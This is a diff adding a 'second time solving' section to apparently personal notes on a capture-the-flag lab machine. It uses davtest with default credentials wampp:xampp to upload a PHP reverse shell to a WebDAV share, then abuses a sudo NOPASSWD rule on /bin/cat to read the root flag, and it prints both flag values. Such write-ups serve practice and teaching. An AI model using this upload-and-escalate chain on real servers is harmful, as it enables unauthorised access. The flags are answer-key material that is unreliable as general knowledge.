@@ -152,3 +152,48 @@ $ sudo /bin/cat /root/root.txt
 
 ```
 
+
+---
+
+
+
+2nd time solving
+
+
+- used [[1. davtest]]. command below
+```
+davtest -uploadfile php-reverse-shell.php -uploadloc webdav.php -url http://10.10.78.230/webdav -auth wampp:xampp   ✔  18:54:54   
+********************************************************
+ Testing DAV connection
+OPEN		SUCCEED:		http://10.10.78.230/webdav
+********************************************************
+ unless  Uploading file
+Upload succeeded: http://10.10.78.230/webdav/webdav.php
+```
+
+- got a reverse shell 
+```
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data
+```
+
+- 1st flag
+```
+$ cat user.txt
+449b40fe93f78a938523b7e4dcd66d2a
+```
+
+- priv esc and 2nd flag
+
+```
+$ sudo -l 
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/cat
+$ sudo /bin/cat /root/root.txt
+101101ddc16b0cdf65ba0b8a7af7afa5
+$ 
+```
+
